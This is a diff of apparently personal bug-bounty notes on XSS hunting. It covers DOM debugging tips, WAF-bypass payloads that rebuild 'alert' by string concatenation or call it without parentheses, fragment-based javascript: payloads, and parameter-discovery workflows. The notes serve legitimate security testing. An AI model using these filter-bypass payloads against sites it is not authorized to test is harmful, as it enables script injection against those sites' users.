@@ -15,7 +15,14 @@ Object.keys(window).filter(k => !k.indexOf('on'))
 - in complex targets, try to change the ==final value of the parameter== you can control (after all the sanitization, changes and Rulesets) and confirm there exists XSS then try to bypass the logic.
 - use breakpoint and then ==browse the site== 
 	- (in some cases, breakpoint won't trigger if you reload the same page)
+	- You must reach such a level in JS debugging that enables you to find and trace every client‑side functionality you encounter while testing an application
 - in SPAs, there is plenty of ==client-side redirects== => DOM XSS
+	- [ ] Pause the state you are in with DOM using escape
+	- [ ] throw exception to furthur understand the procecss 
+		- [ ] unexpected hexchars `%0A`
+		- [ ] `tel:` scheme 
+	- [ ] Enable breakpoints on related event listener from *Dev Tools -> Source -> Event Listener Breakpoints* 
+		- [ ] ![[Pasted image 20260301150611.png]]
 # **FUZZ the whitespaces allowed** 
 - [ ] (re read js for hackers)
 - FUZZ for *HTML tags*
@@ -54,14 +61,14 @@ log=[]; let anchor =document.createElement('a'); for(let i=0;i<0x10ffff; i++){ a
 ```
 ### in JS execution
 ##### alert,prompt,etc (WORDS) are filtered ? 
-- [ ] confuse the waf by String Concatination
+- [ ] confuse the waf by ==String Concatination==
 	- [ ] `[]['cons' + 'tructor']['const' + 'ructor']('aler' + 't(origin)')()`
 	- [ ]  `this['aler' + 't']()`
 	- [ ] `a = this; a['a' + 'lert'](origin)`
-> [!note] scripts to find window object and consequently bypassing the waf in new fasion #gold 
+> [!note] scripts to find custom window object specific to that webapp and consequently bypassing the waf in new fasion #gold 
 ```js
 for (let x in window)
-    if (window[x] === window)
+	    if (window[x] === window)
         console.log(x);
 ```
 ```js
@@ -70,7 +77,12 @@ for (let x in _W)
         if (_W[x][y] === window)
             console.log(x, y);
 ```
-- [ ] window.valueOf=alert;window+1 -> **parentheses-less payloads**
+- Flow:
+	1. ![[Pasted image 20260301145132.png]] 
+	2. ![[Pasted image 20260301145435.png]]
+	3. ![[Pasted image 20260301145249.png]]
+- [ ] ==Misusing tag id ==the same way as custom window variable (This works for every tag id in page) #gold
+	1. ![[Pasted image 20260301150951.png]]
 - [ ] payload in fragment part
 ```js
   location=location.hash.split('#')(1) // #javascript:alert(origin)
@@ -80,9 +92,10 @@ for (let x in _W)
 	- [ ] `\u{000000000000000000000061}`
 ##### paranthesis,brackets,func() etc are filtered?
 - [ ] **alert?.(origin)** -> use `?`
-
-- [ ] parenthesis, brackets, func(), etc are filtered
-    - [ ] `alert?.(origin)`
+- [ ] `a = alert, a(origin)`
+- [ ] `(1, alert)?.(origin)`
+- [ ] `[alert][0].call(this, origin)`
+- [ ] `window.valueOf = alert; window + 1` -> use **parentheses-less payloads**
 ### PostMessage
 - doesn't generate http req => burp doesn't capture 
 - search for EventListeners 
@@ -192,16 +205,17 @@ wList_maker() {
 			- use_FUZZ_engine -> use_remote_engine
 	3. totally new parameters
 - ==**programmers use the same parameter names on different pages**==
-	- (e.g all params -> unfurl (extract params) -> use elsewhere)
+	- [ ] You should fetch all the possible parameter on each page of the site you are hunting on And test them on other pages too 
 - **where**? 
 	- all HTTP req parameters
 	- HTML form names + ids + etc
 	- JS variable names
 	- JSON object in js files
 - example ? 
+	- (e.g all params -> unfurl (extracts params) -> use elsewhere) 
 	- (passive (waymore + paramSpider)(`inurl:? || inurl:&`) + active (manually like GAP + automated like x8 + fallparams))
 	-  (e.g manual GAP -> replace values -> interesting behavior | e.g automated x8)
-	- *MANUALL is ALWASY BETTER* (false positive)
+	- *MANUALL is ALWASY BETTER* (because of false positives)
 ```bash
 param_maker() {
     filename="$1"
